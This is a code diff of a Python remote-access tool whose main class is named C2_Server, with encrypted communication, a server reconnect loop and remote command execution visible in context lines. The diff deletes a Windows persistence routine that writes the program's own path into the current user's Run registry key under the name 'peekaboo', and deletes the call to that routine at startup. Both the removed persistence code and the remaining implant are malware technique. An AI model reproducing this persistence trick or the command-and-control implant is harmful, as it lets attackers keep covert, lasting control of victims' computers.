@@ -21,7 +21,6 @@ from datetime import datetime, timedelta
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 from Crypto.Random import get_random_bytes
-import winreg
 import base64
 import requests
 import socket
@@ -137,16 +136,6 @@ class C2_Server:
         self.command_delimiter = "<START>"
         self.response_delimiter = "<END>"
 
-    def add_to_registry(self):
-        exe_path = sys.executable
-        try:
-            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-            key_name = "peekaboo"
-            winreg.SetValueEx(registry_key, key_name, 0, winreg.REG_SZ, exe_path)
-            winreg.CloseKey(registry_key)
-        except Exception as e:
-            print(f"Error adding to registry: {e}")
-
     def connect_to_server(self):
         while True:
             try:
@@ -190,7 +179,6 @@ class C2_Server:
             return f"[*] Error executing command: {e}"
 
     def start(self):
-        self.add_to_registry()
         while True:
             client = self.connect_to_server()
             try:
